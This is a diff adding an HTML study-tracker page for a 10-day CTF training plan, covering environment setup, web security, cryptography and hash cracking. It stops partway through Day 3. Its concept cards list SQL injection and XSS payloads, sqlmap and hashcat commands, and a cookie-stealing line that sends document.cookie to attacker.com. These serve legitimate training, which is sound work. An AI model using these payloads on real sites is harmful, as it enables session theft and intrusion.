@@ -1,0 +1,2050 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TCS HackQuest 10-Day Training Program</title>
+    <style>
+        :root {
+            --primary: #21808d;
+            --primary-hover: #1d747f;
+            --bg: #fcfcf9;
+            --surface: #fffffe;
+            --text: #13343b;
+            --text-secondary: #626c6d;
+            --border: rgba(94, 82, 64, 0.2);
+            --success: #21808d;
+            --warning: #a84b2f;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background: var(--surface);
+            border-bottom: 2px solid var(--border);
+            padding: 20px 0;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+
+        header h1 {
+            font-size: 28px;
+            margin-bottom: 8px;
+            color: var(--primary);
+        }
+
+        header p {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .progress-overview {
+            background: var(--surface);
+            padding: 25px;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            border: 1px solid var(--border);
+        }
+
+        .progress-bar-container {
+            background: #f0f0f0;
+            height: 30px;
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--primary-hover));
+            transition: width 0.5s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .stat-card {
+            background: rgba(33, 128, 141, 0.08);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid rgba(33, 128, 141, 0.2);
+        }
+
+        .stat-card h3 {
+            font-size: 32px;
+            color: var(--primary);
+            margin-bottom: 5px;
+        }
+
+        .stat-card p {
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .day-tabs {
+            display: flex;
+            gap: 10px;
+            overflow-x: auto;
+            margin-bottom: 25px;
+            padding-bottom: 10px;
+        }
+
+        .day-tab {
+            padding: 12px 24px;
+            background: var(--surface);
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: all 0.3s;
+            font-weight: 500;
+        }
+
+        .day-tab:hover {
+            border-color: var(--primary);
+            background: rgba(33, 128, 141, 0.05);
+        }
+
+        .day-tab.active {
+            background: var(--primary);
+            color: white;
+            border-color: var(--primary);
+        }
+
+        .day-tab.completed {
+            background: rgba(33, 128, 141, 0.1);
+            border-color: var(--success);
+            position: relative;
+        }
+
+        .day-tab.completed::after {
+            content: "✓";
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            background: var(--success);
+            color: white;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .day-content {
+            display: none;
+        }
+
+        .day-content.active {
+            display: block;
+        }
+
+        .section {
+            background: var(--surface);
+            padding: 25px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            border: 1px solid var(--border);
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--border);
+        }
+
+        .section-header h2 {
+            font-size: 20px;
+            color: var(--text);
+        }
+
+        .time-badge {
+            background: rgba(33, 128, 141, 0.15);
+            color: var(--primary);
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .task-list {
+            list-style: none;
+        }
+
+        .task-item {
+            padding: 18px;
+            background: rgba(0,0,0,0.02);
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border-left: 4px solid var(--border);
+            transition: all 0.3s;
+        }
+
+        .task-item:hover {
+            background: rgba(33, 128, 141, 0.05);
+            border-left-color: var(--primary);
+        }
+
+        .task-item.completed {
+            opacity: 0.7;
+            border-left-color: var(--success);
+        }
+
+        .task-header {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .task-checkbox {
+            width: 22px;
+            height: 22px;
+            cursor: pointer;
+            margin-top: 2px;
+            accent-color: var(--primary);
+        }
+
+        .task-content {
+            flex: 1;
+        }
+
+        .task-title {
+            font-weight: 600;
+            font-size: 15px;
+            margin-bottom: 8px;
+            color: var(--text);
+        }
+
+        .task-description {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 12px;
+            line-height: 1.5;
+        }
+
+        .task-meta {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-top: 12px;
+        }
+
+        .meta-tag {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            padding: 5px 12px;
+            background: white;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .resource-links {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 12px;
+        }
+
+        .resource-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 16px;
+            background: var(--primary);
+            color: white;
+            text-decoration: none;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+
+        .resource-link:hover {
+            background: var(--primary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(33, 128, 141, 0.3);
+        }
+
+        .resource-link.secondary {
+            background: rgba(33, 128, 141, 0.1);
+            color: var(--primary);
+        }
+
+        .resource-link.secondary:hover {
+            background: rgba(33, 128, 141, 0.2);
+        }
+
+        .concept-card {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border: 1px solid var(--border);
+        }
+
+        .concept-card h4 {
+            color: var(--primary);
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+
+        .concept-card p {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        .concept-card code {
+            background: rgba(0,0,0,0.05);
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 13px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .practice-labs {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .lab-card {
+            background: linear-gradient(135deg, rgba(33, 128, 141, 0.05), rgba(33, 128, 141, 0.15));
+            padding: 18px;
+            border-radius: 10px;
+            border: 1px solid rgba(33, 128, 141, 0.3);
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+
+        .lab-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(33, 128, 141, 0.2);
+            border-color: var(--primary);
+        }
+
+        .lab-card h5 {
+            color: var(--primary);
+            margin-bottom: 8px;
+            font-size: 15px;
+        }
+
+        .lab-card p {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-bottom: 10px;
+        }
+
+        .lab-difficulty {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .lab-difficulty.beginner {
+            background: rgba(34, 197, 94, 0.15);
+            color: #15803d;
+        }
+
+        .lab-difficulty.intermediate {
+            background: rgba(245, 158, 11, 0.15);
+            color: #d97706;
+        }
+
+        .lab-difficulty.advanced {
+            background: rgba(239, 68, 68, 0.15);
+            color: #dc2626;
+        }
+
+        .quick-links {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            z-index: 1000;
+        }
+
+        .quick-link-btn {
+            width: 55px;
+            height: 55px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            font-size: 24px;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(33, 128, 141, 0.4);
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .quick-link-btn:hover {
+            transform: scale(1.1);
+            background: var(--primary-hover);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: var(--surface);
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--border);
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            font-size: 28px;
+            cursor: pointer;
+            color: var(--text-secondary);
+        }
+
+        .modal-close:hover {
+            color: var(--text);
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+
+            header h1 {
+                font-size: 22px;
+            }
+
+            .stats {
+                grid-template-columns: 1fr 1fr;
+            }
+
+            .day-tabs {
+                flex-wrap: nowrap;
+            }
+
+            .practice-labs {
+                grid-template-columns: 1fr;
+            }
+
+            .quick-links {
+                bottom: 15px;
+                right: 15px;
+            }
+
+            .quick-link-btn {
+                width: 50px;
+                height: 50px;
+                font-size: 20px;
+            }
+        }
+
+        .pdf-preview {
+            background: rgba(33, 128, 141, 0.05);
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid var(--primary);
+            margin: 15px 0;
+        }
+
+        .pdf-preview h4 {
+            color: var(--primary);
+            margin-bottom: 8px;
+            font-size: 15px;
+        }
+
+        .pdf-preview p {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-bottom: 10px;
+        }
+
+        .chapter-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 10px;
+        }
+
+        .chapter-tag {
+            background: white;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 11px;
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+        }
+
+        .markdown-content {
+            line-height: 1.8;
+            color: var(--text);
+        }
+
+        .markdown-content h1 {
+            font-size: 28px;
+            margin: 25px 0 15px 0;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--border);
+        }
+
+        .markdown-content h2 {
+            font-size: 22px;
+            margin: 20px 0 12px 0;
+            color: var(--primary);
+        }
+
+        .markdown-content h3 {
+            font-size: 18px;
+            margin: 18px 0 10px 0;
+        }
+
+        .markdown-content h4 {
+            font-size: 16px;
+            margin: 15px 0 8px 0;
+        }
+
+        .markdown-content p {
+            margin: 12px 0;
+        }
+
+        .markdown-content ul, .markdown-content ol {
+            margin: 12px 0;
+            padding-left: 30px;
+        }
+
+        .markdown-content li {
+            margin: 6px 0;
+        }
+
+        .markdown-content code {
+            background: rgba(33, 128, 141, 0.1);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+
+        .markdown-content pre {
+            background: rgba(0, 0, 0, 0.05);
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 15px 0;
+        }
+
+        .markdown-content pre code {
+            background: none;
+            padding: 0;
+        }
+
+        .markdown-content blockquote {
+            border-left: 4px solid var(--primary);
+            padding-left: 15px;
+            margin: 15px 0;
+            color: var(--text-secondary);
+            font-style: italic;
+        }
+
+        .markdown-content table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+        }
+
+        .markdown-content table th,
+        .markdown-content table td {
+            border: 1px solid var(--border);
+            padding: 10px;
+            text-align: left;
+        }
+
+        .markdown-content table th {
+            background: rgba(33, 128, 141, 0.1);
+            font-weight: 600;
+        }
+
+        .markdown-content a {
+            color: var(--primary);
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+        }
+
+        .markdown-content a:hover {
+            border-bottom-color: var(--primary);
+        }
+
+        .csv-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+
+        .csv-table thead th {
+            background: var(--primary);
+            color: white;
+            padding: 12px;
+            text-align: left;
+            font-weight: 600;
+            position: sticky;
+            top: 0;
+        }
+
+        .csv-table tbody td {
+            padding: 10px 12px;
+            border: 1px solid var(--border);
+        }
+
+        .csv-table tbody tr:nth-child(even) {
+            background: rgba(33, 128, 141, 0.05);
+        }
+
+        .csv-table tbody tr:hover {
+            background: rgba(33, 128, 141, 0.1);
+        }
+
+        .file-viewer-loading {
+            text-align: center;
+            padding: 40px;
+            color: var(--text-secondary);
+        }
+
+        .file-viewer-error {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #dc2626;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>🚀 TCS HackQuest 10-Day Training Program</h1>
+            <p>Your complete roadmap to mastering cybersecurity challenges | Competition Date: December 7, 2025</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="progress-overview">
+            <h2 style="margin-bottom: 15px;">Overall Progress</h2>
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="overallProgress">0%</div>
+            </div>
+            <div class="stats">
+                <div class="stat-card">
+                    <h3 id="completedTasks">0</h3>
+                    <p>Tasks Completed</p>
+                </div>
+                <div class="stat-card">
+                    <h3 id="totalTasks">124</h3>
+                    <p>Total Tasks</p>
+                </div>
+                <div class="stat-card">
+                    <h3 id="completedDays">0</h3>
+                    <p>Days Completed</p>
+                </div>
+                <div class="stat-card">
+                    <h3 id="hoursSpent">0</h3>
+                    <p>Hours Logged</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="day-tabs" id="dayTabs"></div>
+        <div id="dayContentContainer"></div>
+    </div>
+
+    <div class="quick-links">
+        <button class="quick-link-btn" onclick="openResourcesModal()" title="All Resources">📚</button>
+        <button class="quick-link-btn" onclick="openProgressModal()" title="My Progress">📊</button>
+        <button class="quick-link-btn" onclick="resetProgress()" title="Reset Progress">🔄</button>
+    </div>
+
+    <div class="modal" id="resourcesModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>📚 All Resources</h2>
+                <button class="modal-close" onclick="closeModal('resourcesModal')">&times;</button>
+            </div>
+            <div id="allResourcesList"></div>
+        </div>
+    </div>
+
+    <div class="modal" id="fileViewerModal">
+        <div class="modal-content" style="max-width: 900px;">
+            <div class="modal-header">
+                <h2 id="fileViewerTitle">📄 File Viewer</h2>
+                <button class="modal-close" onclick="closeModal('fileViewerModal')">&times;</button>
+            </div>
+            <div id="fileViewerContent" style="max-height: 70vh; overflow-y: auto;"></div>
+        </div>
+    </div>
+
+    <div class="modal" id="progressModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>📊 Detailed Progress</h2>
+                <button class="modal-close" onclick="closeModal('progressModal')">&times;</button>
+            </div>
+            <div id="detailedProgress"></div>
+        </div>
+    </div>
+
+    <script>
+        const trainingData = {
+            day1: {
+                title: "Day 1: Environment Setup & CTF Basics",
+                timeAllocation: "8-10 hours",
+                objectives: ["Set up complete macOS security environment", "Understand CTF fundamentals", "Complete first beginner challenges"],
+                tasks: [
+                    {
+                        id: "d1t1",
+                        title: "macOS Security Environment Setup",
+                        description: "Install all essential tools using Homebrew and configure your system for CTF challenges.",
+                        time: "2 hours",
+                        difficulty: "beginner",
+                        resources: [
+                            { name: "macOS Setup Guide", url: "Guides/macos_security_setup_guide.md", type: "markdown", pages: "Full document" },
+                            { name: "Homebrew Website", url: "https://brew.sh", type: "external" }
+                        ],
+                        concepts: [
+                            { title: "Package Management", content: "Homebrew is the missing package manager for macOS. It allows you to install command-line tools easily using <code>brew install [package]</code>." },
+                            { title: "PATH Configuration", content: "Understanding shell PATH is crucial. Tools installed via Homebrew are added to <code>/opt/homebrew/bin</code> (Apple Silicon) or <code>/usr/local/bin</code> (Intel)." }
+                        ],
+                        steps: [
+                            "Install Homebrew: <code>/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"</code>",
+                            "Install essential tools: nmap, wireshark, burp-suite, radare2",
+                            "Set up Python environment with pip and virtualenv",
+                            "Configure VS Code with security extensions"
+                        ]
+                    },
+                    {
+                        id: "d1t2",
+                        title: "UTM + Kali Linux ARM64 Setup",
+                        description: "Set up virtual machine for Linux-specific tools and practice environment.",
+                        time: "1.5 hours",
+                        difficulty: "beginner",
+                        resources: [
+                            { name: "macOS Setup Guide", url: "#", type: "pdf", pages: "Pages 8-15" },
+                            { name: "UTM Download", url: "https://mac.getutm.app/", type: "external" },
+                            { name: "Kali ARM64 Image", url: "https://www.kali.org/get-kali/#kali-virtual-machines", type: "external" }
+                        ],
+                        concepts: [
+                            { title: "Virtualization", content: "UTM uses Apple's Virtualization framework for near-native performance on Apple Silicon. Allocate 4GB RAM and 4 CPU cores minimum." },
+                            { title: "Shared Folders", content: "Set up shared folders between macOS and Kali for easy file transfer during CTF challenges." }
+                        ]
+                    },
+                    {
+                        id: "d1t3",
+                        title: "Read: CTF Fundamentals",
+                        description: "Understand competition format, scoring, and challenge categories.",
+                        time: "1 hour",
+                        difficulty: "beginner",
+                        resources: [
+                            { name: "Complete Preparation Guide", url: "PDFs/TCS-HackQuest-Complete-Preparation-Guide.pdf", type: "pdf", pages: "Pages 1-8, 15-20" }
+                        ],
+                        concepts: [
+                            { title: "CTF Format", content: "Capture The Flag competitions test cybersecurity skills across multiple categories. Flags follow format: <code>TCS{...}</code> or <code>HQ8...</code>" },
+                            { title: "Challenge Categories", content: "Common categories: Web Exploitation, Cryptography, Forensics, Reverse Engineering, Binary Exploitation, Network Security" },
+                            { title: "Scoring System", content: "Points typically range: Beginner (100-150), Intermediate (200-300), Expert (400-500+). Focus on accuracy and documentation quality." }
+                        ]
+                    },
+                    {
+                        id: "d1t4",
+                        title: "Practice: PicoCTF Beginner Challenges",
+                        description: "Complete 8-10 beginner challenges to build confidence and understand CTF mechanics.",
+                        time: "3 hours",
+                        difficulty: "beginner",
+                        resources: [
+                            { name: "Practice Labs", url: "https://play.picoctf.org/practice", type: "lab" }
+                        ],
+                        labs: [
+                            { name: "PicoCTF - General Skills", difficulty: "beginner", challenges: "5-7", url: "https://play.picoctf.org/practice?category=5&page=1" },
+                            { name: "PicoCTF - Web Exploitation", difficulty: "beginner", challenges: "3-4", url: "https://play.picoctf.org/practice?category=1&page=1" }
+                        ],
+                        concepts: [
+                            { title: "Command Line Basics", content: "Essential commands: <code>ls, cd, cat, grep, find, file, strings</code>. Practice in terminal daily." },
+                            { title: "Problem-Solving Approach", content: "1) Read carefully 2) Identify category 3) Try obvious solutions 4) Research tools 5) Document everything" }
+                        ]
+                    },
+                    {
+                        id: "d1t5",
+                        title: "Study: TCS HackQuest Previous Year Q1-4",
+                        description: "Analyze Season 5 challenges to understand TCS-specific patterns.",
+                        time: "2 hours",
+                        difficulty: "beginner",
+                        resources: [
+                            { name: "Previous Years' Solutions", url: "PDFs/TCS-HackQuest-Previous-Years-Solutions.pdf", type: "pdf", pages: "Pages 5-12 (Season 5, Challenges 1-4)" }
+                        ],
+                        pyqChallenges: [
+                            { name: "I am Always... (EXIF)", points: 100, category: "Forensics" },
+                            { name: "DigiMagic (Certificate)", points: 100, category: "Crypto" },
+                            { name: "Reggie Rich (Regex)", points: 100, category: "Web" },
+                            { name: "Pandemic Inhibitor (API)", points: 400, category: "Web" }
+                        ]
+                    }
+                ]
+            },
+            day2: {
+                title: "Day 2: Web Security Fundamentals",
+                timeAllocation: "10-12 hours",
+                objectives: ["Master SQL injection techniques", "Understand XSS exploitation", "Practice with vulnerable web apps"],
+                tasks: [
+                    {
+                        id: "d2t1",
+                        title: "Study: SQL Injection Deep Dive",
+                        description: "Learn all SQL injection variants from basic to advanced.",
+                        time: "2 hours",
+                        difficulty: "intermediate",
+                        resources: [
+                            { name: "Mock Challenges Walkthrough", url: "PDFs/TCS-HackQuest-Mock-Challenges-Walkthrough.pdf", type: "pdf", pages: "Pages 3-8 (Challenges 1, 5)" },
+                            { name: "PortSwigger Academy", url: "https://portswigger.net/web-security/sql-injection", type: "tutorial" },
+                            { name: "File Navigation Guide", url: "PDFs/File-Navigation-Guide.pdf", type: "pdf", pages: "Day 2 section" }
+                        ],
+                        concepts: [
+                            { title: "SQL Injection Types", content: "Classic SQLi: <code>' OR '1'='1</code>, Union-based: <code>UNION SELECT</code>, Boolean-based blind, Time-based blind, Out-of-band" },
+                            { title: "Information Schema", content: "Database metadata: <code>information_schema.tables</code>, <code>information_schema.columns</code> - Use to enumerate database structure" },
+                            { title: "SQLmap Automation", content: "Powerful tool: <code>sqlmap -u URL --batch --dump</code>. Understand manual exploitation first!" }
+                        ]
+                    },
+                    {
+                        id: "d2t2",
+                        title: "Practice: DVWA SQL Injection Labs",
+                        description: "Set up DVWA via Docker and complete all SQL injection levels.",
+                        time: "3 hours",
+                        difficulty: "intermediate",
+                        resources: [
+                            { name: "macOS Setup Guide", url: "Guides/macos_security_setup_guide.md", type: "markdown", pages: "Docker section" }
+                        ],
+                        labs: [
+                            { name: "DVWA - SQL Injection (Low)", difficulty: "beginner", challenges: "1", url: "http://localhost" },
+                            { name: "DVWA - SQL Injection (Medium)", difficulty: "intermediate", challenges: "1", url: "http://localhost" },
+                            { name: "DVWA - SQL Injection (High)", difficulty: "advanced", challenges: "1", url: "http://localhost" },
+                            { name: "HackTheBox - SQL Injection Labs", difficulty: "intermediate", challenges: "3-5", url: "https://app.hackthebox.com/tracks/SQL-Injection" },
+                            { name: "TryHackMe - SQL Injection Room", difficulty: "beginner", challenges: "8", url: "https://tryhackme.com/room/sqlinjectionlm" }
+                        ],
+                        steps: [
+                            "Run DVWA: <code>docker run -d -p 80:80 vulnerables/web-dvwa</code>",
+                            "Access at http://localhost, login: admin/password",
+                            "Complete Low security level manually (no SQLmap)",
+                            "Progress to Medium/High with tool assistance",
+                            "Document each payload that works"
+                        ]
+                    },
+                    {
+                        id: "d2t3",
+                        title: "Study: Cross-Site Scripting (XSS)",
+                        description: "Understand reflected, stored, and DOM-based XSS attacks.",
+                        time: "1.5 hours",
+                        difficulty: "intermediate",
+                        resources: [
+                            { name: "Mock Challenges Walkthrough", url: "PDFs/TCS-HackQuest-Mock-Challenges-Walkthrough.pdf", type: "pdf", pages: "Pages 12-15 (Challenge 8)" },
+                            { name: "PortSwigger XSS Labs", url: "https://portswigger.net/web-security/cross-site-scripting", type: "tutorial" },
+                            { name: "XSS Game by Google", url: "https://xss-game.appspot.com/", type: "lab" }
+                        ],
+                        concepts: [
+                            { title: "XSS Types", content: "Reflected: URL parameter, Stored: Database/file, DOM: Client-side JavaScript manipulation" },
+                            { title: "Common Payloads", content: "<code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, <code>&lt;img src=x onerror=alert(1)&gt;</code>, <code>&lt;svg onload=alert(1)&gt;</code>" },
+                            { title: "Cookie Theft", content: "Exfiltrate cookies: <code>document.location='http://attacker.com?c='+document.cookie</code>" }
+                        ]
+                    },
+                    {
+                        id: "d2t4",
+                        title: "Practice: PortSwigger XSS Labs",
+                        description: "Complete 10 XSS labs covering different scenarios and bypasses.",
+                        time: "3 hours",
+                        difficulty: "intermediate",
+                        labs: [
+                            { name: "PortSwigger - Reflected XSS", difficulty: "beginner", challenges: "3", url: "https://portswigger.net/web-security/all-labs#cross-site-scripting" },
+                            { name: "PortSwigger - Stored XSS", difficulty: "beginner", challenges: "2", url: "https://portswigger.net/web-security/all-labs#cross-site-scripting" },
+                            { name: "PortSwigger - DOM XSS", difficulty: "intermediate", challenges: "3", url: "https://portswigger.net/web-security/all-labs#cross-site-scripting" },
+                            { name: "TryHackMe - XSS Room", difficulty: "beginner", challenges: "7", url: "https://tryhackme.com/room/xss" },
+                            { name: "HackTheBox - XSS Track", difficulty: "intermediate", challenges: "4-6", url: "https://app.hackthebox.com/tracks/XSS" }
+                        ]
+                    },
+                    {
+                        id: "d2t5",
+                        title: "Solve: TCS PYQ Web Challenges",
+                        description: "Recreate Solutions for Season 5 & 7 web exploitation challenges.",
+                        time: "2.5 hours",
+                        difficulty: "intermediate",
+                        resources: [
+                            { name: "Previous Years' Solutions", url: "PDFs/TCS-HackQuest-Previous-Years-Solutions.pdf", type: "pdf", pages: "Pages 5-7, 13-18" },
+                            { name: "Report Template", url: "Templates/tcs_hackquest_report_template.md", type: "markdown", pages: "Use for practice" }
+                        ],
+                        pyqChallenges: [
+                            { name: "Reggie Rich (PHP Regex)", points: 100, category: "Web", season: 5 },
+                            { name: "Pandemic Inhibitor (API)", points: 400, category: "Web", season: 5 },
+                            { name: "Trusting Response", points: 100, category: "Web", season: 7 },
+                            { name: "Search Shenanigans (Regex)", points: 100, category: "Web", season: 7 }
+                        ],
+                        steps: [
+                            "Recreate each challenge environment locally",
+                            "Solve WITHOUT looking at solution first (30 min attempt)",
+                            "Compare your approach with provided solution",
+                            "Write your own report using template"
+                        ]
+                    }
+                ]
+            },
+            day3: {
+                title: "Day 3: Cryptography & Encoding",
+                timeAllocation: "9-11 hours",
+                objectives: ["Master classical ciphers", "Understand modern cryptography", "Practice hash cracking"],
+                tasks: [
+                    {
+                        id: "d3t1",
+                        title: "Study: Classical Cryptography",
+                        description: "Learn Caesar, Vigenère, substitution ciphers and Base64 encoding chains.",
+                        time: "2 hours",
+                        difficulty: "beginner",
+                        resources: [
+                            { name: "Mock Challenges Walkthrough", url: "PDFs/TCS-HackQuest-Mock-Challenges-Walkthrough.pdf", type: "pdf", pages: "Pages 8-10 (Challenges 3, 6, 7)" },
+                            { name: "Complete Preparation Guide", url: "PDFs/TCS-HackQuest-Complete-Preparation-Guide.pdf", type: "pdf", pages: "Pages 21-25 (Crypto)" },
+                            { name: "dCode.fr Tools", url: "https://www.dcode.fr/en", type: "tool" },
+                            { name: "CyberChef", url: "https://gchq.github.io/CyberChef/", type: "tool" }
+                        ],
+                        concepts: [
+                            { title: "Caesar Cipher", content: "Simple shift cipher. ROT13 is special case (shift 13). Easily brute-forced: only 25 possible keys." },
+                            { title: "Vigenère Cipher", content: "Polyalphabetic cipher using keyword. Find key length with Kasiski examination or frequency analysis." },
+                            { title: "Base64 Encoding", content: "Not encryption! Encoding scheme using A-Z, a-z, 0-9, +, /. Padding with =. Recognizable by trailing = signs." },
+                            { title: "Encoding Chains", content: "Multiple layers: Base64 → Hex → ROT13. Decode in reverse order. Use CyberChef for automation." }
+                        ]
+                    },
+                    {
+                        id: "d3t2",
+                        title: "Practice: CryptoHack Intro Challenges",
+                        description: "Complete beginner cryptography challenges to build foundation.",
+                        time: "2.5 hours",
+                        difficulty: "beginner",
+                        labs: [
+                            { name: "CryptoHack - Introduction", difficulty: "beginner", challenges: "8", url: "https://cryptohack.org/challenges/introduction/" },
+                            { name: "CryptoHack - General", difficulty: "beginner", challenges: "5", url: "https://cryptohack.org/challenges/general/" },
+                            { name: "TryHackMe - Cryptography Basics", difficulty: "beginner", challenges: "6", url: "https://tryhackme.com/room/cryptographyintro" },
+                            { name: "OverTheWire - Krypton", difficulty: "beginner", challenges: "7 levels", url: "https://overthewire.org/wargames/krypton/" }
+                        ]
+                    },
+                    {
+                        id: "d3t3",
+                        title: "Study: Modern Cryptography (RSA, Hashing)",
+                        description: "Understand public-key cryptography and hash functions.",
+                        time: "1.5 hours",
+                        difficulty: "intermediate",
+                        resources: [
+                            { name: "Previous Years' Solutions", url: "PDFs/TCS-HackQuest-Previous-Years-Solutions.pdf", type: "pdf", pages: "Pages 23-25 (Optimus Prime - RSA)" },
+                            { name: "RsaCtfTool", url: "https://github.com/Ganapati/RsaCtfTool", type: "tool" }
+                        ],
+                        concepts: [
+                            { title: "RSA Fundamentals", content: "Public key (n, e), Private key (n, d). Encryption: C = M^e mod n, Decryption: M = C^d mod n" },
+                            { title: "RSA Attacks", content: "Small exponent (e=3), Weak primes (factorable n), Common modulus attack, Wiener's attack (small d)" },
+                            { title: "Hash Functions", content: "MD5 (broken), SHA1 (deprecated), SHA256 (current standard). One-way, collision-resistant" },
+                            { title: "Password Cracking", content: "Dictionary attacks with rockyou.txt, Rainbow tables, Hashcat GPU acceleration" }
+                        ]
+                    },
+                    {
+                        id: "d3t4",
+                        title: "Practice: Hash Cracking with Hashcat",
+                        description: "Set up hashcat and crack various hash types.",
+                        time: "2 hours",
+                        difficulty: "intermediate",
+                        steps: [
+                            "Install: <code>brew install hashcat</code>",
+                            "Download rockyou.txt wordlist",
+                            "Crack MD5: <code>hashcat -m 0 -a 0 hash.txt rockyou.txt</code>",
+                            "Crack SHA256: <code>hashcat -m 1400 -a 0 hash.txt rockyou.txt</code>",
+                            "Practice with hashes from Mock Challenges PDF"
+                        ],
+                        labs: [
+                            { name: "CrackStation Practice", difficulty: "beginner", challenges: "Self-created", url: "https://crackstation.net/" },
+                            { name: "TryHackMe - Hash Cracking", difficulty: "beginner", challenges: "5", url: "https://tryhackme.com/room/crackthehash" },
+                            { name: "HackTheBox - Crypto Challenges", difficulty: "intermediate", challenges: "5-8", url: "https://app.hackthebox.com/challenges/cryptography" }
+                        ]
+                    },
+                    {
+                        id: "d3t5",
+                        title: "Solve: TCS PYQ Crypto Challenges",
+                        description: "Complete all cryptography challenges from previous seasons.",
+                        time: "3 hours",
